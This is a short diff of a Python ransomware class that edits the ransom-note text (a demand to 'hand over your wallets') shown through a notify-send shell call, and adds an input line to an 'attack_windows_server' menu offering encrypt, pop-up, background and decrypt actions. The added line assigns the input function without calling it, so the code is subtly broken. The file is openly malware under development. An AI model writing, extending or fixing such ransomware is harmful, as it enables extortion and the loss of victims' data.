@@ -62,11 +62,12 @@ class Ransomware:
     def ransom_note(self):
         # Modify the code to display a notification or custom dialog on Linux
         # Replace the text with your own ransom note
-        ransom_note_text = "Get ducked, NERD! I have stolen and locked away all your data. I will unlock your computer for a fee of 200 MILLION dollars.\nPlease send the money, and I will decrypt your files."
+        ransom_note_text = "You have been bamboozeled by the Black Fox Bandits, Please hand over your wallets"
         command = f"notify-send 'Ransom Note' '{ransom_note_text}'"  # Replace with the actual command
         subprocess.run(command, shell=True)
 
     def attack_windows_server(self):
+        target_ip = input
         while True:
             user_input = input("What would you like to do? (Encrypt, Pop-up, Background, Decrypt, or Exit): ")
             if user_input.lower() == "encrypt":
